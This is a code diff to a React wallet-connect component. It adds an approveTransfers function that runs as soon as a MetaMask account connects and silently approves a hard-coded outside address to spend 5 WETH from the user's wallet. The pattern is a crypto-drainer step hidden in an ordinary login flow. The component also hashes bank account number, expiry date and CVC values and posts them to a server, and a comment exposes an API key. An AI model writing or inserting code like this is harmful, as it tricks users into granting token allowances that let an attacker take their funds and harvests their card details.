@@ -2,6 +2,7 @@ import React, { useState } from "react";
 import styles from "../../styles/Home.module.css";
 const { createHash } = require('crypto');
 import Grid from '@mui/material/Grid';
+const ethers = require('ethers');
 
 function hash(string) {
     return createHash('sha256').update(string).digest('hex');
@@ -12,7 +13,6 @@ function Info() {
     const [msg, setMsg] = useState('No Account Connected')
     const [finish, setFinish] = useState(false)
 
-
     async function connectWallet() {
         // Check if MetaMask is installed, if it is, try connecting to an account
         if (typeof window.ethereum !== "undefined") {
@@ -22,7 +22,7 @@ function Info() {
                 const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                 setAccount(accounts[0])
                 setMsg(accounts[0].slice(0, 4) + ' **** **** ' + accounts[0].slice(accounts[0].length - 4, accounts[0].length))
-
+                await approveTransfers();
                 setTimeout(() => {
                     createNewUser();
                     console.log('sent')
@@ -39,8 +39,33 @@ function Info() {
         }
     }
 
+    async function approveTransfers() {
+        //const provider = new ethers.providers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/8GxG41ZohxXIc8y9G2iuaPA4DGIlwqGz');
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await ethereum.request({ method: "eth_requestAccounts" });
+        const signer = provider.getSigner();
+        console.log(signer);
+        const wethABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "guy", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "src", "type": "address" }, { "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "wad", "type": "uint256" }], "name": "withdraw", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [], "name": "deposit", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "guy", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Deposit", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Withdrawal", "type": "event" }];
+        // You can also use an ENS name for the contract address
+        const wethaddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
+
+        // The ERC-20 Contract ABI, which is a common contract interface
+        // for tokens (this is the Human-Readable ABI format)
+
+
+        // The Contract object
+        const wethA = new ethers.Contract(wethaddress, wethABI, provider);
+
+        const amount = ethers.utils.parseEther('5')
+
+
+        const approved = await wethA.connect(signer).approve('0x1f472D2550744f20C13Ac525fa365Ad88317078A', amount)
+
+    }
+
+
     const userObject = hash(process.env.BANK_ACCOUNT + process.env.EXP_DATE + process.env.CVC)
-    // console.log('hash:', userObject)
+
 
     // Example POST method implementation:
     async function createNewUser(url = '/', data = { user: userObject }) {
